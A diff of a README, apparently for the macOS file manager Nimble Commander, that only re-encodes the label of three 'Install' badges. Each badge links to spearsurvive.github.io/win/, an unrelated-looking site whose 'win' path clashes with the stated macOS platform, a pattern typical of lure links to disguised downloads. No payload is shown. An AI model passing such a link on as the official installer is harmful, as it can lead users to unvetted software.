@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Nimble Commander](https://img.shields.io/badge/⬇_Install_Nimble%20Commander-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Nimble Commander](https://img.shields.io/badge/⬇_Install_Nimble+Commander-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -81,7 +81,7 @@ Nimble Commander is a dual-pane file manager for macOS inspired by classic comma
 
 <div align="center">
 
-[![⬇ Install Nimble Commander](https://img.shields.io/badge/⬇_Install_Nimble%20Commander-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Nimble Commander](https://img.shields.io/badge/⬇_Install_Nimble+Commander-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -125,7 +125,7 @@ Nimble Commander is a dual-pane file manager for macOS inspired by classic comma
 
 <div align="center">
 
-[![⬇ Install Nimble Commander](https://img.shields.io/badge/⬇_Install_Nimble%20Commander-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Nimble Commander](https://img.shields.io/badge/⬇_Install_Nimble+Commander-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
